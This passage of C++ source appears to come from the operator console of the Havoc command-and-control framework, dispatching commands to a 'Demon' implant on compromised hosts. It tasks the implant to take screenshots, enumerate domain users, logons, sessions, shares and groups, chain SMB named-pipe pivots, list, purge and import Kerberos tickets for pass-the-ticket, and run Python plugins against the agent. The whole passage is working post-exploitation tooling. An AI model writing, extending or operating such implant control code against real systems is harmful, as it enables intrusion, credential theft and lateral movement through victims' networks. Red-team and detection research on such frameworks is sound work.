                DemonConsole->TaskError( "Not enough arguments" );
            }
        }
        else if ( InputCommands[ 0 ].compare( "screenshot" ) == 0 )
        {
            TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to take a screenshot" );
            CommandInputList[ TaskID ] = commandline;

            SEND( Execute.Screenshot( TaskID ) )
        }
        else if ( InputCommands[ 0 ].compare( "net" ) == 0 )
        {
            if ( InputCommands.size() >= 2 )
            {
                auto Command = QString();
                auto Param   = QString();

                Param = "\\\\localhost";

                if ( InputCommands[ 1 ].compare( "domain" ) == 0 )
                {
                    Command = "1";
                    TaskID  = CONSOLE_INFO( "Tasked demon to display domain for this host" );
                    Param   = "";
                }
                else if ( InputCommands[ 1 ].compare( "logons" ) == 0 )
                {
                    Command = "2";
                    TaskID  = CONSOLE_INFO( "Tasked demon to lists users logged onto a host" );

                    if ( InputCommands.size() > 2 )
                        Param = InputCommands[ 2 ];
                }
                else if ( InputCommands[ 1 ].compare( "sessions" ) == 0 )
                {
                    Command = "3";
                    TaskID  = CONSOLE_INFO( "Tasked demon to lists sessions on a host" );

                    if ( InputCommands.size() > 2 )
                        Param = InputCommands[ 2 ];
                }
                    /*else if ( InputCommands[ 1 ].compare( "computers" ) == 0 )
                    {
                        Command = "4";
                        TaskID  = CONSOLE_INFO( "Tasked demon to lists computer in a domain (groups)" );

                        if ( InputCommands.size() > 2 )
                            Param = InputCommands[ 2 ];
                    }
                    else if ( InputCommands[ 1 ].compare( "dclist" ) == 0 )
                    {
                        Command = "5";
                        TaskID  = CONSOLE_INFO( "Tasked demon to lists domain controllers" );

                        if ( InputCommands.size() > 2 )
                            Param = InputCommands[ 2 ];
                    }*/
                else if ( InputCommands[ 1 ].compare( "share" ) == 0 )
                {
                    Command = "6";
                    TaskID  = CONSOLE_INFO( "Tasked demon to lists shares on a host" );

                    if ( InputCommands.size() > 2 )
                        Param = InputCommands[ 2 ];
                }
                else if ( InputCommands[ 1 ].compare( "localgroup" ) == 0 )
                {
                    Command = "7";
                    TaskID  = CONSOLE_INFO( "Tasked demon to lists local groups and users in local groups" );

                    if ( InputCommands.size() > 2 )
                        Param = InputCommands[ 2 ];
                }
                else if ( InputCommands[ 1 ].compare( "group" ) == 0 )
                {
                    Command = "8";
                    TaskID  = CONSOLE_INFO( "Tasked demon to lists groups and users in groups" );

                    if ( InputCommands.size() >= 3 )
                        Param = InputCommands[ 2 ];

                }
                else if ( InputCommands[ 1 ].compare( "users" ) == 0 )
                {
                    Command = "9";
                    TaskID  = CONSOLE_INFO( "Tasked demon to lists users and user information" );

                    if ( InputCommands.size() >= 3 )
                        Param = InputCommands[ 2 ];
                }
                else
                {
                    CONSOLE_ERROR( "Command not found: " + InputCommands.join( ' ' ) )
                    return false;
                }

                CommandInputList[ TaskID ] = commandline;
                SEND( Execute.Net( TaskID, Command, Param ) )

            }
            else
            {
                CONSOLE_ERROR( "No sub command specified" )
            }
        }
        else if ( InputCommands[ 0 ].compare( "pivot" ) == 0 )
        {
            if ( InputCommands.size() > 1 )
            {
                auto Command = QString();
                auto Param   = QString();

                if ( InputCommands[ 1 ].compare( "list" ) == 0 )
                {
                    TaskID  = CONSOLE_INFO( "Tasked demon to list connected agent pivots" );
                    Command = "1";
                }
                else if ( InputCommands[ 1 ].compare( "connect" ) == 0 )
                {
                    // TODO: For now only Smb
                    Command = "10";

                    if ( InputCommands.size() >= 4 )
                    {
                        auto Host = InputCommands[ 2 ];
                        auto Addr = InputCommands[ 3 ];

                        Param = "\\\\" + Host + "\\pipe\\" + Addr;
                        TaskID = CONSOLE_INFO( "Tasked demon to connect to a smb pivot: " + Param );
                    }
                    else
                    {
                        CONSOLE_ERROR( "Not enough arguments" )
                        return false;
                    }
                }
                else if ( InputCommands[ 1 ].compare( "disconnect" ) == 0 )
                {
                    if ( InputCommands.size() < 3 )
                    {
                        CONSOLE_ERROR( "Not enough arguments" )
                        return false;
                    }

                    Command = "11";
                    Param   = InputCommands[ 2 ];
                    TaskID  = CONSOLE_INFO( "Tasked demon to disconnect a smb pivot: " + Param );
                }
                else
                {
                    CONSOLE_ERROR( "Command not found: " + InputCommands.join( ' ' ) )
                    return false;
                }

                CommandInputList[ TaskID ] = commandline;
                SEND( Execute.Pivot( TaskID, Command, Param ) )
            }
        }
        else if ( InputCommands[ 0 ].compare( "luid" ) == 0 )
        {
            TaskID                     = CONSOLE_INFO( "Tasked demon to get the current logon ID" );
            CommandInputList[ TaskID ] = commandline;

            SEND( Execute.Luid( TaskID ) )
        }
        else if ( InputCommands[ 0 ].compare( "klist" ) == 0 )
        {
            auto Arg1 = QString();
            auto Arg2 = QString();

            if ( InputCommands.size() < 2 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands.size() > 3 )
            {
                CONSOLE_ERROR( "Too many arguments" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "/all" ) == 0 )
            {
                Arg1 = "/all";
            }
            else if ( InputCommands[ 1 ].compare( "/luid" ) == 0 )
            {
                if ( InputCommands.size() != 3 )
                {
                    CONSOLE_ERROR( "Invalid parameter" )
                    return false;
                }
                Arg1 = "/luid";
                Arg2 = InputCommands[ 2 ];
            }
            else
            {
                CONSOLE_ERROR( "Invalid parameter" )
                return false;
            }

            TaskID                     = CONSOLE_INFO( "Tasked demon to list Kerberos tickets" );
            CommandInputList[ TaskID ] = commandline;

            SEND( Execute.Klist( TaskID, Arg1, Arg2 ) );
        }
        else if ( InputCommands[ 0 ].compare( "purge" ) == 0 )
        {
            auto Arg = QString();

            if ( InputCommands.size() < 3 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands.size() > 3 )
            {
                CONSOLE_ERROR( "Too many arguments" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "/luid" ) == 0 )
            {
                Arg = InputCommands[ 2 ];
            }
            else
            {
                CONSOLE_ERROR( "Invalid parameter" )
                return false;
            }

            TaskID                     = CONSOLE_INFO( "Tasked demon to purge a Kerberos ticket" );
            CommandInputList[ TaskID ] = commandline;

            SEND( Execute.Purge( TaskID, Arg ) );
        }
        else if ( InputCommands[ 0 ].compare( "ptt" ) == 0 )
        {
            auto Ticket = QString();
            QString Luid = "0";

            if ( InputCommands.size() < 2 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands.size() > 4 )
            {
                CONSOLE_ERROR( "Too many arguments" )
                return false;
            }

            Ticket = InputCommands[ 1 ];

            if ( InputCommands.size() == 3 )
            {
                CONSOLE_ERROR( "Invalid arguments" )
                return false;
            }

            if ( InputCommands.size() == 4 )
            {
                if ( InputCommands[ 2 ].compare( "/luid" ) != 0 )
                {
                    CONSOLE_ERROR( "Invalid arguments" )
                    return false;
                }
                Luid = InputCommands[ 3 ];
            }

            TaskID                     = CONSOLE_INFO( "Tasked demon to import a Kerberos ticket" );
            CommandInputList[ TaskID ] = commandline;

            SEND( Execute.Ptt( TaskID, Ticket, Luid ) );
        }
        else if ( InputCommands[ 0 ].compare( "exit" ) == 0 )
        {
            if ( InputCommands.length() < 2 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            if ( InputCommands.length() > 2 )
            {
                CONSOLE_ERROR( "Too many arguments" )
                return false;
            }
            if ( InputCommands[ 1 ].compare( "thread" ) == 0 )
            {
                TaskID                     = CONSOLE_INFO( "Tasked demon to cleanup and exit the thread" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Exit( TaskID, "thread" ) )
            }
            else if ( InputCommands[ 1 ].compare( "process" ) == 0 )
            {
                TaskID                     = CONSOLE_INFO( "Tasked demon to cleanup and exit the process" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Exit( TaskID, "process" ) )
            }
            else
            {
                CONSOLE_ERROR( "Option not found: " + InputCommands[ 1 ] )
                return false;
            }
        }
        else if ( InputCommands[ 0 ].compare( "clear" ) == 0 )
        {
            auto AgentMessageInfo = QString();
            auto PivotStream      = QString();
            auto prev_cursor      = QTextCursor();

            DemonConsole->Console->clear();

            if ( DemonConsole->SessionInfo.PivotParent.size() > 0 )
            {
                PivotStream = "[Pivot: " + DemonConsole->SessionInfo.PivotParent + Util::ColorText::Cyan( "-<>-<>-" ) + DemonConsole->SessionInfo.Name + "]";
            }
            else
            {
                PivotStream = "[Pivot: "+ Util::ColorText::Cyan( "Direct" ) +"]";
            }

            AgentMessageInfo =
                    Util::ColorText::Comment( DemonConsole->SessionInfo.First ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
                    " :: [Internal: "+Util::ColorText::Cyan( DemonConsole->SessionInfo.Internal ) + "] [Process: " + Util::ColorText::Red( DemonConsole->SessionInfo.Process +"\\"+ DemonConsole->SessionInfo.PID ) + "] [Arch: " +Util::ColorText::Pink( DemonConsole->SessionInfo.Arch ) + "] " + PivotStream;

            prev_cursor = DemonConsole->Console->textCursor();

            DemonConsole->Console->moveCursor ( QTextCursor::End );
            DemonConsole->Console->insertHtml( AgentMessageInfo );
            DemonConsole->Console->setTextCursor( prev_cursor );

            return true;
        }
        else if ( InputCommands[ 0 ].compare( "" ) == 0 )
        {
            /* do nothing */
        }
        else
        {
            if ( ! Send && ! CommandTaskInfo[ TaskID ].isEmpty() )
            {
                DemonConsole->AppendRaw();
                DemonConsole->AppendRaw( Prompt );
                DemonConsole->AppendRaw( Util::ColorText::Cyan( "[*]" ) + " " + Util::ColorText::Comment( "[" + TaskID + "]") + " " + Util::ColorText::Cyan( CommandTaskInfo[ TaskID ] ) );
            }

        CheckRegisteredCommands:
            spdlog::debug( "Check if one of the registered commands it is lol." );

            auto FoundCommand = false;

            // check for registered commands
            for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
            {
                if ( InputCommands[ 0 ].isEmpty() )
                    break;

                if ( Command.Agent != "Demon" )
                    continue;

                /* Check if module is matching */
                if ( InputCommands[ 0 ].compare( Command.Module.c_str() ) == 0 )
                {
                    if ( InputCommands.size() <= 1 )
                    {
                        if ( Send )
                        {
                            CONSOLE_ERROR( "Specify a sub command for the given module." );
                        }

                        return false;
                    }

                    /* Check if command is matching */
                    if ( InputCommands[ 1 ].compare( Command.Command.c_str() ) == 0 )
                    {
                        PyObject* FuncArgs = PyTuple_New( InputCommands.size() - 1 );
                        PyObject* Return   = nullptr;
                        auto      Path     = std::string();

                        spdlog::debug( "Found module: {} {}", Command.Module.c_str(), Command.Command.c_str() );

                        if ( Send )
                        {
                            if ( ! PyCallable_Check( ( PyObject* ) Command.Function ) )
                            {
                                DemonConsole->TaskError( "A callable is required for " + InputCommands[ 0 ] + " " + InputCommands[ 1 ] );
                                return false;
                            }

                            if ( ! Command.Path.empty() )
                            {
                                Path = std::filesystem::current_path();
                                spdlog::debug( "Set current path to {}", Command.Path );
                                std::filesystem::current_path( Command.Path );
                            }
                            spdlog::debug( "execute script command:{}", Command.Command );

                            // First arg is the DemonID
                            PyTuple_SetItem( FuncArgs, 0, PyUnicode_FromString( this->DemonID.toStdString().c_str() ) );

                            // Set arguments of the functions
                            for ( u32 i = 2; i < InputCommands.size(); i++ )
                                PyTuple_SetItem( FuncArgs, i - 1, PyUnicode_FromString( InputCommands[ i ].toStdString().c_str() ) );

                            Return = PyObject_CallObject( ( PyObject* ) Command.Function, FuncArgs );

                            if ( ! Path.empty() )
                            {
                                spdlog::debug( "Set path back to {}", Path );
                                std::filesystem::current_path( Path );
                            }

                            if ( Return == nullptr && PyErr_Occurred() )
                            {
                                PyErr_PrintEx(0);
                                PyErr_Clear();
                                DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + " " + InputCommands[ 1 ] + ". Python module failed" );
                                Py_CLEAR( FuncArgs );
                                return false;
                            }

                            if ( Py_IsNone( Return ) || Py_IsTrue( Return ) || Py_IsFalse( Return ) )
                            {
                                if ( Send )
                                {
                                    PrintModuleCachedMessages();

                                    if ( Py_IsNone( Return ) )
                                        DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + " " + InputCommands[ 1 ] + ". Script return is None" );
                                }
                                Py_CLEAR( Return );
                                Py_CLEAR( FuncArgs );
                                return false;
                            }

                            if ( ! Py_IS_TYPE( Return, &PyUnicode_Type ) )
                            {
                                if ( Send )
                                {
                                    PrintModuleCachedMessages();

                                    DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + " " + InputCommands[ 1 ] + ". Script return is invalid" );
                                }
                                Py_CLEAR( Return );
                                Py_CLEAR( FuncArgs );
                                return false;
                            }

                            auto ReturnTaskID = PyUnicode_AsUTF8( Return );

                            TaskID = QString( ReturnTaskID );

                            NewPackageCommand( Teamserver, Util::Packager::Body_t {
                                    .SubEvent = Util::Packager::Session::SendCommand,
                                    .Info     = {
                                            { "TaskID",      TaskID.toStdString() },
                                            { "TaskMessage", CommandTaskInfo[ TaskID ].toStdString() },
                                            { "DemonID",     DemonConsole->SessionInfo.Name.toStdString() },
                                            { "CommandID",   "Python Plugin" },
                                            { "CommandLine", commandline.toStdString() },
                                    },
                            } );

                            Py_CLEAR( Return );
                            Py_CLEAR( FuncArgs );
                        }

                        return true;
                    }
                }
                /* Alright it's a command i hope ? Check if command is matching */
                else if ( InputCommands[ 0 ].compare( Command.Command.c_str() ) == 0 && Command.Module.length() == 0 )
                {
                    PyObject* FuncArgs = PyTuple_New( InputCommands.size() );
                    PyObject* Return   = NULL;
                    auto      Path     = std::string();

                    if ( Send )
                    {
                        if ( ! PyCallable_Check( ( PyObject* ) Command.Function ) )
                        {
                            PyErr_SetString( PyExc_TypeError, "a callable is required" );
                            return false;
                        }

                        if ( ! Command.Path.empty() )
                        {
                            Path = std::filesystem::current_path();
                            spdlog::debug( "Set current path to {}", Command.Path );
                            std::filesystem::current_path( Command.Path );
                        }

                        spdlog::debug( "execute script command: {}", Command.Command );

                        // First arg is the DemonID
                        PyTuple_SetItem( FuncArgs, 0, PyUnicode_FromString( this->DemonID.toStdString().c_str() ) );

                        // Set arguments of the functions
                        for ( u32 i = 1; i < InputCommands.size(); i++ )
                            PyTuple_SetItem( FuncArgs, i, PyUnicode_FromString( InputCommands[ i ].toStdString().c_str() ) );

                        Return = PyObject_CallObject( ( PyObject* ) Command.Function, FuncArgs );

                        if ( ! Path.empty() )
                        {
                            spdlog::debug( "Set path back to {}", Path );
                            std::filesystem::current_path( Path );
                        }

                        if ( Return == nullptr && PyErr_Occurred() )
                        {
                            PyErr_PrintEx(0);
                            PyErr_Clear();
                            DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + ". Python module failed" );
                            Py_CLEAR( FuncArgs );
                            return false;
                        }

                        if ( Py_IsNone( Return ) || Py_IsTrue( Return ) || Py_IsFalse( Return ) )
                        {
                            if ( Send )
                            {
                                PrintModuleCachedMessages();

                                if ( Py_IsNone( Return ) )
                                    DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + ". Script return is None" );
                            }
                            Py_CLEAR( Return );
                            Py_CLEAR( FuncArgs );
                            return false;
                        }

                        if ( ! Py_IS_TYPE( Return, &PyUnicode_Type ) )
                        {
                            if ( Send )
                            {
                                PrintModuleCachedMessages();

                                DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + ". Script return is invalid" );
                            }
                            Py_CLEAR( Return );
                            Py_CLEAR( FuncArgs );
                            return false;
                        }

                        auto ReturnTaskID = PyUnicode_AsUTF8( Return );

                        TaskID = QString( ReturnTaskID );

                        NewPackageCommand( Teamserver, Util::Packager::Body_t {
                                .SubEvent = Util::Packager::Session::SendCommand,
                                .Info     = {
                                        { "TaskID",      TaskID.toStdString() },
                                        { "TaskMessage", CommandTaskInfo[ TaskID ].toStdString() },
                                        { "DemonID",     DemonConsole->SessionInfo.Name.toStdString() },
                                        { "CommandID",   "Python Plugin" },
                                        { "CommandLine", commandline.toStdString() },
                                },
                        } );

                        Py_CLEAR( Return );
                        Py_CLEAR( FuncArgs );
                    }

                    return true;
                }
            }

            if ( ! FoundCommand )
            {
                CONSOLE_ERROR( "Command/Module not found: " + commandline )
            }

            return false;
        }
    }
    else
    {
        if (InputCommands[0].compare("help") == 0)
        {
            if (InputCommands.size() > 1 && InputCommands[1] != "")
            {
                spdlog::info("show help for command");
            }
            else
            {
                int TotalSize = 18;

                DemonConsole->Console->append("");
                DemonConsole->Console->append("  Command           Type         Description");
                DemonConsole->Console->append("  ---------         -------      -----------");

                std::vector<QString> commandOutput;

                for (auto &command : AgentData.Commands)
                {
                    if (!command.Anonymous)
                    {
                        commandOutput.push_back("  " + command.Name + QString(std::string((TotalSize - command.Name.size()), ' ').c_str()) + "Command" + "      " + command.Description);
                    }
                }

                // Sort the commandOutput vector alphabetically
                std::sort(commandOutput.begin(), commandOutput.end(), compareQString);

                for (auto &command : HavocX::Teamserver.RegisteredCommands)
                {
                    if (command.Agent == AgentTypeName.toStdString())
                    {
                        QString currentCommand = "  " + QString(command.Command.c_str()) + QString(std::string((TotalSize - command.Command.size()), ' ').c_str()) + "Command" + "      " + QString(command.Help.c_str());

                        // Find the position to insert the current command in the sorted commandOutput vector
                        auto insertPosition = std::lower_bound(commandOutput.begin(), commandOutput.end(), currentCommand, compareQString);

                        // Insert the current command to the commandOutput vector in the proper position
                        commandOutput.insert(insertPosition, currentCommand);
                    }
                }

                // Append the sorted commands to the console
                for (const auto &output : commandOutput)
                {
                    DemonConsole->Console->append(output);
                }
            }
        }

        else if ( InputCommands[ 0 ].compare( "clear" ) == 0 )
        {
            auto AgentMessageInfo = QString();
            auto PivotStream      = QString();
            auto prev_cursor      = QTextCursor();

            DemonConsole->Console->clear();

            if ( DemonConsole->SessionInfo.PivotParent.size() > 0 )
            {
                PivotStream = "[Pivot: " + DemonConsole->SessionInfo.PivotParent + Util::ColorText::Cyan( "-<>-<>-" ) + DemonConsole->SessionInfo.Name + "]";
            }
            else
            {
                PivotStream = "[Pivot: "+ Util::ColorText::Cyan( "Direct" ) +"]";
            }

            AgentMessageInfo =
                    Util::ColorText::Comment( DemonConsole->SessionInfo.First ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
                    " :: [Internal: "+Util::ColorText::Cyan( DemonConsole->SessionInfo.Internal ) + "] [Process: " + Util::ColorText::Red( DemonConsole->SessionInfo.Process +"\\"+ DemonConsole->SessionInfo.PID ) + "] [Arch: " +Util::ColorText::Pink( DemonConsole->SessionInfo.Arch ) + "] " + PivotStream;

            prev_cursor = DemonConsole->Console->textCursor();

            DemonConsole->Console->moveCursor ( QTextCursor::End );
            DemonConsole->Console->insertHtml( AgentMessageInfo );
            DemonConsole->Console->setTextCursor( prev_cursor );


            return true;
        }
        else
        {
            auto CommandInput = QMap<string, string>();
            auto ParamArray   = ParseQuotes(commandline);

            auto ParamSize    = ParamArray.size();
            auto CommandFound = false;

            ParamArray.erase(ParamArray.begin());

            if ( ! Send )
            {
                if ( ! CommandTaskInfo[ TaskID ].isEmpty() )
                {
                    DemonConsole->AppendRaw();
                    DemonConsole->AppendRaw( Prompt );
                    DemonConsole->AppendRaw( Util::ColorText::Cyan( "[*]" ) + " " + CommandTaskInfo[ TaskID ] );
                }
            }

            for (auto & command : AgentData.Commands)
            {
                if (InputCommands[0].compare(command.Name) == 0)
                {
                    TaskID       = Util::gen_random( 8 ).c_str();
                    CommandFound = true;

                    CommandInput.insert("TaskID",      TaskID.toStdString());
                    CommandInput.insert("CommandLine", commandline.toStdString());
                    CommandInput.insert("DemonID",     DemonConsole->SessionInfo.Name.toStdString());
                    CommandInput.insert("Command",     command.Name.toStdString());

                    ParamArray.push_back("");
                    for (u32 i = 0; i < command.Params.size(); ++i)
                    {
                        auto Value = QString();

                        if (command.Params[i].IsFilePath)
                        {
                            auto f = FileRead(ParamArray[i]);
                            if (f != nullptr) Value = f.toBase64();
                            else
                            {
                                CONSOLE_ERROR("File not found: " + ParamArray[i]);
                                return false;
                            }
                        }
                        else if (ParamSize > 1 && command.Params.size() < ParamSize && (command.Params.size() - i) == 1) 
                            Value = JoinAtIndexPreserveQuotes(ParamArray, i);
                        else if (!command.Params[i].IsOptional)
                        {
                            if (i < ParamSize - 1) Value = ParamArray[i];
                            else
                            {
                                CONSOLE_ERROR("Required parameter not given: " + command.Params[i].Name);
                                return false;
                            }
                        }
                        else if (i < ParamSize - 1) Value = ParamArray[i];

                        CommandInput.insert(command.Params[i].Name.toStdString(), Value.toStdString());
                    }
                }
            }

            if ( CommandFound )
            {
                /* send command to agent handler */
                SEND( Execute.AgentCommand( CommandInput ) );
            }
            else
            {
                CommandFound = false;

                for ( auto & Command : HavocX::Teamserver.RegisteredCommands )
                {
                    if ( InputCommands[ 0 ].isEmpty() )
                        break;

                    if ( Command.Agent == AgentTypeName.toStdString() )
                    {
                        if ( InputCommands[ 0 ].compare( Command.Command.c_str() ) == 0 )
                        {
                            PyObject* FuncArgs = PyTuple_New( InputCommands.size() );
                            PyObject* Return   = nullptr;
                            auto      Path     = std::string();

                            CommandFound = true;

                            if ( Send )
                            {
                                if ( ! PyCallable_Check( ( PyObject* ) Command.Function ) )
                                {
                                    PyErr_SetString( PyExc_TypeError, "a callable is required" );
                                    return false;
                                }

                                if ( ! Command.Path.empty() )
                                {
                                    Path = std::filesystem::current_path();
                                    spdlog::debug( "Set current path to {}", Command.Path );
                                    std::filesystem::current_path( Command.Path );
                                }

                                // First arg is the DemonID
                                PyTuple_SetItem( FuncArgs, 0, PyUnicode_FromString( this->DemonID.toStdString().c_str() ) );

                                // Set arguments of the functions
                                for ( u32 i = 1; i < InputCommands.size(); i++ )
                                    PyTuple_SetItem( FuncArgs, i, PyUnicode_FromString( InputCommands[ i ].toStdString().c_str() ) );

                                Return = PyObject_CallObject( ( PyObject* ) Command.Function, FuncArgs );

                                if ( ! Path.empty() )
                                {
                                    spdlog::debug( "Set path back to {}", Path );
                                    std::filesystem::current_path( Path );
                                }

                                if ( Return == nullptr && PyErr_Occurred() )
                                {
                                    PyErr_PrintEx(0);
                                    PyErr_Clear();
                                    DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] + ". Python module failed" );
                                    Py_CLEAR( FuncArgs );
                                    return false;
                                }

                                if ( Py_IsNone( Return ) )
                                {
                                    if ( Send )
                                    {
                                        DemonConsole->Console->append( "" );
                                        DemonConsole->Console->append( this->Prompt );

                                        for ( auto& message : DemonConsole->DemonCommands->BufferedMessages )
                                            DemonConsole->Console->append( message );
                                    }

                                    DemonConsole->TaskError( "Failed to execute " + InputCommands[ 0 ] );

                                    Py_CLEAR( Return );
                                    Py_CLEAR( FuncArgs );

                                    return false;
                                }

                                TaskID = QString( PyUnicode_AsUTF8( Return ) );

                                NewPackageCommand( Teamserver, Util::Packager::Body_t {
                                        .SubEvent = Util::Packager::Session::SendCommand,
                                        .Info     = {
                                                { "TaskID",      TaskID.toStdString() },
                                                { "TaskMessage", CommandTaskInfo[ TaskID ].toStdString() },
                                                { "DemonID",     DemonConsole->SessionInfo.Name.toStdString() },
                                                { "CommandID",   "Python Plugin" },
                                                { "CommandLine", commandline.toStdString() },
                                        },
                                } );

                                Py_CLEAR( Return );
                                Py_CLEAR( FuncArgs );
                            }

                            return true;
                        }
                    }
                }
            }

            if ( ! CommandFound )
            {
                CONSOLE_ERROR( "Command/Module not found: " + commandline )
            }

        }

    }

    return true;
}

auto DemonCommands::PrintModuleCachedMessages( ) -> void
{
    if ( DemonConsole->DemonCommands->BufferedMessages.size() > 0 )
    {
        DemonConsole->Console->append( "" );
        DemonConsole->Console->append( this->Prompt );

        /* display any messages that the script made */
        for ( auto& message : DemonConsole->DemonCommands->BufferedMessages )
            DemonConsole->Console->append( message );

        DemonConsole->DemonCommands->BufferedMessages.clear();
    }
}
